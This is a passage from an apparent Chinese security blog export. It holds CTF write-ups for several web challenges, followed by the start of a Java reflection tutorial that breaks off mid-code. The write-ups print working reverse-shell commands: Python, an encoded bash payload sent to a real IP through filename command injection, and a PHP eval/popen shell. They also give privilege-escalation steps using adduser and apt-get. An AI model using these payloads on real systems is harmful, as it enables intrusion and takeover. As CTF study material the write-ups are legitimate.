class="string">&#x27;223171425729702&#x27;</span>,  <span class="comment"># /sys/class/net/eth0/address mac地址十进制</span></span><br><span class="line">    <span class="string">&#x27;19088900-1695-441f-9f76-7379c20e5547bf7ece62cf3b189c136c57b05e74107bcb7209ce7bac7c5790d857b5ec7da7b0&#x27;</span></span><br><span class="line">    <span class="comment"># 字符串合并：1./etc/machine-id(docker不用看) /proc/sys/kernel/random/boot_id，有boot-id那就拼接boot-id 2. /proc/self/cgroup</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>计算完pin码之后拼接访问：&#x2F;console，键入pin码即可执行python代码。后续利用python反弹shell，在env里面找到flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;攻击者IP&quot;,端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/23/664f010c96994.png" alt="image-20240523104935783"></p><h2 id="GoJava"><a href="#GoJava" class="headerlink" title="GoJava"></a>GoJava</h2><p><img src="https://bu.dusays.com/2024/05/23/664f010c0e235.png" alt="image-20240523105524678"></p><p>dirsearch扫下</p><p><img src="https://bu.dusays.com/2024/05/23/664f010cdfa75.png" alt="image-20240523110101572"></p><p>robots.txt泄露，</p><p><img src="https://bu.dusays.com/2024/05/23/664f010abec91.png" alt="image-20240523110152633"></p><p>main-old.zip下载得到源码</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;mime/multipart&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> blacklistChars = []<span class="type">rune</span>&#123;<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 设置路由</span></span><br><span class="line">http.HandleFunc(<span class="string">&quot;/gojava&quot;</span>, compileJava)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置静态文件服务器</span></span><br><span class="line">fs := http.FileServer(http.Dir(<span class="string">&quot;.&quot;</span>))</span><br><span class="line">http.Handle(<span class="string">&quot;/&quot;</span>, fs)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动服务器</span></span><br><span class="line">log.Println(<span class="string">&quot;Server started on :80&quot;</span>)</span><br><span class="line">log.Fatal(http.ListenAndServe(<span class="string">&quot;:80&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isFilenameBlacklisted</span><span class="params">(filename <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line"><span class="keyword">for</span> _, char := <span class="keyword">range</span> filename &#123;</span><br><span class="line"><span class="keyword">for</span> _, blackChar := <span class="keyword">range</span> blacklistChars &#123;</span><br><span class="line"><span class="keyword">if</span> char == blackChar &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">compileJava</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line"><span class="comment">// 检查请求方法是否为POST</span></span><br><span class="line"><span class="keyword">if</span> r.Method != http.MethodPost &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Method not allowed&quot;</span>, http.StatusMethodNotAllowed)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析multipart/form-data格式的表单数据</span></span><br><span class="line">err := r.ParseMultipartForm(<span class="number">10</span> &lt;&lt; <span class="number">20</span>) <span class="comment">// 设置最大文件大小为10MB</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Error parsing form&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从表单中获取上传的文件</span></span><br><span class="line">file, handler, err := r.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Error retrieving file&quot;</span>, http.StatusBadRequest)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> file.Close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> isFilenameBlacklisted(handler.Filename) &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Invalid filename: contains blacklisted character&quot;</span>, http.StatusBadRequest)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> !strings.HasSuffix(handler.Filename, <span class="string">&quot;.java&quot;</span>) &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Invalid file format, please select a .java file&quot;</span>, http.StatusBadRequest)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">err = saveFile(file, <span class="string">&quot;./upload/&quot;</span>+handler.Filename)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;Error saving file&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">saveFile</span><span class="params">(file multipart.File, filePath <span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="comment">// 创建目标文件</span></span><br><span class="line">f, err := os.Create(filePath)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> f.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将上传的文件内容复制到目标文件中</span></span><br><span class="line">_, err = io.Copy(f, file)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到对文件名做了一定的waf</p><p>学了一点go <strong>暑假狂补！</strong></p><p>真就go写的，简单来说是对java文件进行编译操作</p><p>题目是对java文件进行编译操作，就是系统命令执行javac拼接文件名</p><p>系统命令，后面肯定是要跟上文件名的，所以猜测会有命令注入漏洞，构造恶意命令文件名如下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;1;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIzLjkxLjQ0LzIzMzMgMD4mMSI= | base64 -d | bash;1.java&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/124.223.91.44/2333 0&gt;&amp;1&quot;</span><br><span class="line">YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIzLjkxLjQ0LzIzMzMgMD4mMSI=</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/23/664f010b5d2d7.png" alt="image-20240523111546822"></p><p>反弹shell</p><p>这里由于对于文件名进行了部分waf，所以使用编码来避免麻烦，</p><p>连到：</p><p><img src="https://bu.dusays.com/2024/05/23/664f010b08a06.png" alt="image-20240523111632964"></p><p>在根目录有个memorandum，里面是root的密码 （查看备忘录文件，用该密码成功su root ）</p><p><img src="https://bu.dusays.com/2024/05/23/664f010b083ac.png" alt="image-20240523111755779"></p><p><img src="https://bu.dusays.com/2024/05/23/664f010ad484d.png" alt="image-20240523111919056"></p><p><img src="https://bu.dusays.com/2024/05/23/664f010b0894b.png" alt="image-20240523112102148"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">H2LvFxnWENLqVxE</span><br><span class="line"></span><br><span class="line">su root</span><br><span class="line"></span><br><span class="line">cat /root/f*</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/23/664f010af16bd.png" alt="image-20240523112226696"></p><h2 id="GPTS"><a href="#GPTS" class="headerlink" title="GPTS"></a>GPTS</h2><p>复现不出来 看明白吧</p><p>[CVE-2024-31224](<a href="https://docs.qq.com/scenario/link.html?url=https://xz.aliyun.com/t/14283?time__1311=mqmx9QiQKDqGqx05dIDymDuDAOqf2+kdurD&alichlgref=https://www.bing.com/&pid=300000000$bDhoMFLayxGJ&cid=144115212596424763">https://xz.aliyun.com/t/14283?time__1311&#x3D;mqmx9QiQKDqGqx05dIDymDuDAOqf2%2BkdurD&amp;alichlgref&#x3D;https%3A%2F%2Fwww.bing.com%2F (qq.com)</a>)</p><p>参考：<a href="https://xz.aliyun.com/t/14283%EF%BC%8C%E5%89%8D%E5%8F%B0%E5%AD%98%E5%9C%A8Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E%E3%80%82">https://xz.aliyun.com/t/14283，前台存在Pickle反序列漏洞。</a></p><blockquote><p>gpt_academic历史漏洞，今年的CVE，cookie处可以pickle反序列化，写个反弹shell的pickle，拿到 shell，&#x2F;var&#x2F;mail下拿到ctfer的密码，登录ctfer，sudo -l，可以sudo执行adduser，sudo adduser ctfer root，加入用户组，cat &#x2F;etc&#x2F;sudoers，kobe用户可以sudo执行apt-get，添加一个kobe用户，sudo adduser –gid 0 kobe，切换到kobe用户，sudo &#x2F;usr&#x2F;bin&#x2F;apt-get update -o APT::Update::PreInvoke::&#x3D;&#x2F;bin&#x2F;sh，提权到root，&#x2F;root&#x2F;f????&#x2F;f?????，flag在这里</p></blockquote><p><a href="https://xz.aliyun.com/t/14283?time__1311=mqmx9QiQKDqGqx05dIDymDcmrovhG2bD&alichlgref=https://www.baidu.com/link?url=qSno1OmP9d2CmUVNF6dWlj3IPjQSJnN9EOdDQoHSahQwxVadWoNWhlQH3ZbKBhJV&wd=&eqid=965c761d00710cf200000006664181f0">gpt_academic</a></p><p>开始时一个<strong>pickle反序列化漏洞</strong>，具体操作博客里面都有，就不具体说了</p><p>由于需要提权，所以上一下vshell做下权限维持，用户为ctfgame，上内核探针和信息收集没搜到什么东西，最终在</p><p>&#x2F;var&#x2F;spool&#x2F;mail&#x2F;ctfgame中发现如下内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">From root,</span><br><span class="line">To ctfgame(ctfer),</span><br><span class="line"></span><br><span class="line">You know that I&#x27;m giving you permissions to make it easier for you to build your website, but now your users have been hacked.</span><br><span class="line"></span><br><span class="line">This is the last chance, please take care of your security, I helped you reset your account password.</span><br><span class="line"></span><br><span class="line">ctfer : KbsrZrSCVeui#+R</span><br><span class="line"></span><br><span class="line">I hope you cherish this opportunity.</span><br></pre></td></tr></table></figure><p>尝试切换用户，切换成功，继续vshell上线</p><p>上传linpeas和LinEnum做信息收集（sudo -l）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] We can sudo without supplying a password!</span><br><span class="line">Matching Defaults entries for ctfer on hnctf-01hxryr832qjjc3astkt4rw4dw:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User ctfer may run the following commands on hnctf-01hxryr832qjjc3astkt4rw4dw:</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/adduser, !/usr/sbin/adduser * sudo, !/usr/sbin/adduser * admin</span><br></pre></td></tr></table></figure><p>收集到如上信息，简单来说</p><ul><li>用户ctfer可以以root权限运行以下命令，而且无需输入密码：<ul><li><code>/usr/sbin/adduser</code>: 允许执行adduser命令。</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/bin/mount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br></pre></td></tr></table></figure><p>我们将用户添加到root组</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo adduser ctfer root</span><br><span class="line">sudo adduser --gid 0 chu0</span><br></pre></td></tr></table></figure><p>新建用户然后切换，然后再进行一次信息收集</p><p>读取&#x2F;etc&#x2F;sudoers</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#</span><br><span class="line"># This file MUST be edited with the &#x27;visudo&#x27; command as root.</span><br><span class="line">#</span><br><span class="line"># Please consider adding local content in /etc/sudoers.d/ instead of</span><br><span class="line"># directly modifying this file.</span><br><span class="line">#</span><br><span class="line"># See the man page for details on how to write a sudoers file.</span><br><span class="line">#</span><br><span class="line">Defaults        env_reset</span><br><span class="line">Defaults        mail_badpass</span><br><span class="line">Defaults        secure_path=&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span><br><span class="line"></span><br><span class="line"># Host alias specification</span><br><span class="line"></span><br><span class="line"># User alias specification</span><br><span class="line"></span><br><span class="line"># Cmnd alias specification</span><br><span class="line"></span><br><span class="line"># User privilege specification</span><br><span class="line">root    ALL=(ALL:ALL) ALL</span><br><span class="line"></span><br><span class="line"># Allow members of group sudo to execute any command</span><br><span class="line">%sudo   ALL=(ALL:ALL) ALL</span><br><span class="line"></span><br><span class="line"># See sudoers(5) for more information on &quot;@include&quot; directives:</span><br><span class="line"></span><br><span class="line">@includedir /etc/sudoers.d</span><br><span class="line">ctfer ALL=(root) NOPASSWD: /usr/sbin/adduser, !/usr/sbin/adduser * sudo, !/usr/sbin/adduser * admin</span><br><span class="line">kobe ALL=(root) PASSWD: /usr/bin/apt-get</span><br></pre></td></tr></table></figure><p>可以发现有一个用户具有apt-get的root权限，尝试新建用户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo adduser --gid 0 kobe</span><br><span class="line"></span><br><span class="line">kobe@hnctf-01hxryr832qjjc3astkt4rw4dw:/tmp$ id</span><br><span class="line">uid=1005(kobe) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><p>使用apt-get进行提权</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/apt-get update -o APT::Update::Pre-Invoke::=/bin/sh</span><br></pre></td></tr></table></figure><p>root目录拿到flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /root/f*/f*</span><br></pre></td></tr></table></figure><h2 id="奇怪的网站"><a href="#奇怪的网站" class="headerlink" title="奇怪的网站"></a>奇怪的网站</h2><p>这个复现都复现不出来QAQ</p><p>进去网站有302跳转，看源码提示 vim缓存文件泄露，扫描目录发现flag.php，缓存文件为 .flag.php.swm(4次异常退出导致)，</p><p>找到hint: “ 没有扫到那个文件吗?!或者去首页看看?” </p><p>扫描时，只有403文件以及200文件是实际存在的，403状态码是无权限访问，再根据首页index.png  居然被解析为php网站，可以推测.htaccess存在配置解析，同时也扫到了403  状态码的.htaccess文件。</p><p>404.php，响应包头有提示：<code>Secret: PUT之后,服务器就直接写文件了吗?</code>, </p><p>&gt;预请求就是复杂请求（可能对服务器数据产生副作用的HTTP请求方法，如put，delete都会对服务器数据进行更修改，所以要先询问服务器）。  </p><p>&gt;跨域请求中，浏览器自发的发起的预请求,浏览器会查询到两次请求，第一次的请求参数是options，以检测试实际请求是否可以被浏览器接受</p><p><img src="https://img2.imgtp.com/2024/04/30/muXsmxa0.png"></p><p>考察 尝试更改method方法为 OPTIONS ，可以利用文件读取漏洞，读取.htaccess文件隐藏文件ggggoku.php，进行rce</p><p>根据php解析特性（通过查看phpinfo 发现禁用了很多函数，但发现popen函数可以使用，fget也别过滤了用fgetss读，记得url编码）</p><p>rce绕过：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gggoku.php?a=$&#123;eval($_POST[0])&#125;</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line"></span><br><span class="line">$fd=popen(&quot;bash -c  &#x27;bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1&#x27;&quot;,&#x27;r&#x27;);  </span><br><span class="line">while($s=fgetss($fd))&#123;  </span><br><span class="line">print_r($s);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现没有权限读根目录flag，那么我们需要提权</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/su</span><br></pre></td></tr></table></figure><p>用su命令，root密码在&#x2F;home&#x2F;admin&#x2F;passwd文件中</p><p>注意：使用su命令可能出现su must be used in terminal</p><p>使用如下命令即可：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usr/bin/script -qc /bin/bash /dev/null</span><br></pre></td></tr></table></figure><p> 执行这个命令之后解决了</p><p>在&#x2F;bin&#x2F;bash（Bash shell）中以非交互模式运行&#x2F;usr&#x2F;bin&#x2F;script，并将输出记录到&#x2F;dev&#x2F;null</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反射</title>
      <link href="/2024/05/15/java%E5%8F%8D%E5%B0%84/"/>
      <url>/2024/05/15/java%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<h1 id="java反射"><a href="#java反射" class="headerlink" title="java反射"></a>java反射</h1><p>Java安全可以从反序列化漏洞开始说起，反序列化漏洞又可以从反射开始说起。</p><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制</p><p>简单的说就是可以任意访问和使用任意类</p><p>java反射是通过获取字节码文件来获取其对应的Class类型的对象的</p><h2 id="反射的使用"><a href="#反射的使用" class="headerlink" title="反射的使用"></a>反射的使用</h2><p>反射相关类：</p><table><thead><tr><th>Class类</th><th>代表类的实体，在运行的Java应用程序中表示类和接口</th></tr></thead><tbody><tr><td>Field类</td><td>代表类的成员变量&#x2F;字段</td></tr><tr><td>Method类</td><td>代表类的方法</td></tr><tr><td>Constructor类</td><td>代表类的构造方法</td></tr></tbody></table><h3 id="获取字节码文件-获取Class对象"><a href="#获取字节码文件-获取Class对象" class="headerlink" title="获取字节码文件(获取Class对象)"></a>获取字节码文件(获取Class对象)</h3><p>有三种方法</p><ul><li><p>obj.getClass() 如果上下⽂中存在某个类的实例 obj ，那么我们可以直接通过obj.getClass() 来获取它的类</p></li><li><p>Test.class 如果你已经加载了某个类，只是想获取到它的 java.lang.Class 对象，那么就直接拿它的 class 属性即可。这个⽅法其实不属于反射。</p></li><li><p>Class.forName 如果你知道某个类的名字，想获取到这个类，就可以使⽤ forName 来获取 主要forName后面跟的是全类名，也就是包名+类名</p></li></ul><p>其中forName是最常用的</p><p>这样说还是不太容易理解 上代码！</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fanshe;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取Class对象的三种方式</span></span><br><span class="line"><span class="comment"> * 1 Object ——&gt; getClass();</span></span><br><span class="line"><span class="comment"> * 2 任何数据类型（包括基本数据类型）都有一个“静态”的class属性</span></span><br><span class="line"><span class="comment"> * 3 通过Class类的静态方法：forName（String  className）(常用)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fanshe</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//第一种方式获取Class对象  </span></span><br><span class="line"><span class="type">Student</span> <span class="variable">stu1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();<span class="comment">//这一new 产生一个Student对象，一个Class对象。</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">stuClass</span> <span class="operator">=</span> stu1.getClass();<span class="comment">//获取Class对象</span></span><br><span class="line">System.out.println(stuClass.getName());</span><br><span class="line"></span><br><span class="line"><span class="comment">//第二种方式获取Class对象</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">stuClass2</span> <span class="operator">=</span> Student.class;</span><br><span class="line">System.out.println(stuClass == stuClass2);<span class="comment">//判断第一种方式获取的Class对象和第二种方式获取的是否是同一个 结果为true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第三种方式获取Class对象</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">Class</span> <span class="variable">stuClass3</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;fanshe.Student&quot;</span>);<span class="comment">//注意此字符串必须是真实路径，就是带包名的类路径，包名.类名</span></span><br><span class="line">System.out.println(stuClass3 == stuClass2);<span class="comment">//判断三种方式是否获取的是同一个Class对象</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在安全研究中，我们使⽤反射的⼀⼤⽬的，就是绕过某些沙盒。⽐如，上下⽂中如果只有Integer类型的</p><p>数字，我们如何获取到<strong>可以执⾏命令的Runtime类</strong>呢？也许可以这样（伪代</p><p>码）： <code>getClass().forName(&quot;java.lang.Runtime&quot;)</code></p><p>forName有两个函数重载：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; forName(String name)</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt; forName(String name, **<span class="type">boolean</span>** initialize, ClassLoader loader)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第⼀个就是我们最常⻅的获取class的⽅式，其实可以理解为第⼆种⽅式的⼀个封装：</p><p>默认情况下， forName 的第⼀个参数是类名；第⼆个参数表示是否初始化；第三个参数就</p><p>是 ClassLoader 。</p><p>ClassLoader 是什么呢？它就是⼀个“加载器”，告诉Java虚拟机如何加载这个类。Java默认的 ClassLoader 就是根据类名来加载类，这个类名是类完整路径，如 <code>java.lang.Runtime </code>。</p><p>第二个参数initialize</p><p>其实在 forName 的时候，构造函数并不会执⾏，即使我们设置 initialize&#x3D;true 。</p><p>那么这个初始化究竟指什么呢？</p><p>可以将这个“初始化”理解为类的初始化。我们先来看看如下这个类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrainPrint</span> &#123;</span><br><span class="line"> &#123;</span><br><span class="line"> System.out.printf(<span class="string">&quot;Empty block initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">static</span> &#123;</span><br><span class="line"> System.out.printf(<span class="string">&quot;Static initial %s\n&quot;</span>, TrainPrint.class);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="title function_">TrainPrint</span><span class="params">()</span> &#123;</span><br><span class="line"> System.out.printf(<span class="string">&quot;Initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>三个“初始化”⽅法有什么区别，调⽤顺序是什么?</p><p>其实你运⾏⼀下就知道了，⾸先调⽤的是 <code>static &#123;&#125;</code> ，其次是 <code>&#123;&#125;</code> ，最后是构造函数。</p><p>其中， <code>static &#123;&#125;</code> 就是在“类初始化”的时候调⽤的，⽽ <code>&#123;&#125;</code> 中的代码会放在构造函数的super() 后⾯，但在当前构造函数内容的前⾯。</p><p>所以说， forName 中的 initialize&#x3D;true 其实就是告诉Java虚拟机是否执⾏”类初始化“。</p><p>Class类中常用获得类相关的方法：</p><p>getClassLoader()获得类的加载器<br>getDeclaredClasses()返回一个数组，数组中包含该类中所有类和接口类的对象<br>forName(String classRoad)根据类的路径返回类的Class对象(该方法是静态成员方法)<br>newInstacne()创建类的实例<br>getName()获得类的完整路径名</p><h3 id="获取构造方法并使用"><a href="#获取构造方法并使用" class="headerlink" title="获取构造方法并使用"></a>获取构造方法并使用</h3><p>想要获取一个类的构造方法 当然要先获取这个构造方法所在的类</p><p>然后再使用函数：</p><p><code>getConstructors()</code> 这是获取所有公共的构造方法</p><p><code>getDeclaredConstructors()</code> 这是获取所有的构造方法 包括私有和受保护的</p><p><code>clazz.getConstructor(xxxx)</code> 这是获取指定的公共构造方法 </p><p><code>getDeclaredConstructor(xxxx)</code> 这是获取指定的构造方法</p><p>注意 构造方法是支持重载的 所以在获取指定的构造方法时 要写清楚后面的数据类型</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取包</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime1&quot;</span>); <span class="comment">//随便乱写的一个包</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//无参构造</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">con1</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line"></span><br><span class="line"><span class="comment">//有参构造 参数一致 传的是字节码文件</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">con2</span> <span class="operator">=</span> clazz.getDeclaredConstructor(String.class);</span><br><span class="line"><span class="comment">// int的参就是int.class 其他同理</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>创建一个类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;<span class="comment">//公共的成员变量</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> <span class="number">1</span>;<span class="comment">//私有的成员变量</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;公共的构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Student</span><span class="params">(<span class="type">int</span> id)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        System.out.println(<span class="string">&quot;私有的构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">func</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;公共的成员方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">func2</span><span class="params">(String s)</span>&#123;</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Student&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span 